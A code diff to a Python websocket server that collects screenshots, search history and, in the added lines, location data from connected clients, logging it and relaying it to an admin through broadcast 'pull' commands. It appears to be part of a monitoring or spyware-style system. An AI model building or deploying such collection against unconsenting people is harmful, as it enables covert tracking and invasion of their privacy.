@@ -46,7 +46,7 @@ async def handle_client(websocket):
                 if command == "update_screenshots":
                     # Decode Base64 payload and save it to a file
                     screenshot_data = base64.b64decode(payload)
-                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+                    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                     filename = f"screenshot_{timestamp}.png"
                     file_path = os.path.join(SCREENSHOT_DIR, filename)
 
@@ -71,6 +71,14 @@ async def handle_client(websocket):
                     }
                     save_search_history(payload)
                     await broadcast(admin_message)
+
+                elif command == "update_location":
+                    admin_message = {
+                        "command": "update_location",
+                        "payload": payload,
+                    }
+                    save_locations(payload)
+                    await broadcast(admin_message)
                 
                 elif command == "pull_screenshots":
                     response = {"command": "pull_screenshots"}
@@ -78,6 +86,10 @@ async def handle_client(websocket):
 
                 elif command == "pull_search_history":
                     response = {"command": "pull_search_history"}
+                    await broadcast(response)
+
+                elif command == "pull_location":
+                    response = {"command": "pull_location"}
                     await broadcast(response)
 
                 else:
@@ -137,6 +149,17 @@ async def pull_screenshots():
 
 async def pull_history():
     await send_command_to_all("pull_search_history")
+
+async def pull_location():
+    await send_command_to_all("pull_location")
+
+def save_locations(location_data):
+    try:
+        with open("location_data.txt", "a") as file:
+            file.write(f"{location_data}\n")
+        logger.info("location_data saved to file.")
+    except Exception as e:
+        logger.error(f"Failed to save location_data: {e}")
 
 # Save the search history to a text file
 def save_search_history(history_data):
